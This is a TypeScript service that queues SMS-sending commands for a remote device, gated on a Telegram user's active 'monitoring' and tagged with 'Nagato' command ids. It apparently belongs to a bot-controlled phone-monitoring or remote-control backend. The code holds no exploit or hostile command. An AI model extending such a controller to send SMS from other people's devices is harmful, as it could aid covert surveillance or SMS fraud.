import crypto from "crypto";

import { SmsQueueRepository } from "../../database/repositories/SmsQueueRepository";
import { MonitoringRepository } from "../../database/repositories/MonitoringRepository";

export class SmsQueueService {

    static enqueue(data: {

        telegramId: number;

        backendId: number;

        deviceId: string;

        phoneNumber: string;

        message: string;

        simSlot: number;

        hash: string;

    }) {

        // User must have active monitoring
        if (
            !MonitoringRepository.isMonitoring(
                data.telegramId
            )
        ) {

            return {

                success: false,

                message:
                    "Monitoring is not active."

            };

        }

        // Generate Nagato command id
        const commandId =
            `cmd_${Date.now()}_${crypto
                .randomBytes(4)
                .toString("hex")}`;

        // Extra safety
        const exists =
            SmsQueueRepository.findByCommandId(
                commandId
            );

        if (exists) {

            return {

                success: false,

                message:
                    "Duplicate command generated."

            };

        }

        SmsQueueRepository.enqueue({

            telegramId:
                data.telegramId,

            backendId:
                data.backendId,

            deviceId:
                data.deviceId,

            commandId,

            phoneNumber:
                data.phoneNumber,

            message:
                data.message,

            simSlot:
                data.simSlot

        });

        return {

            success: true,

            commandId

        };

    }

}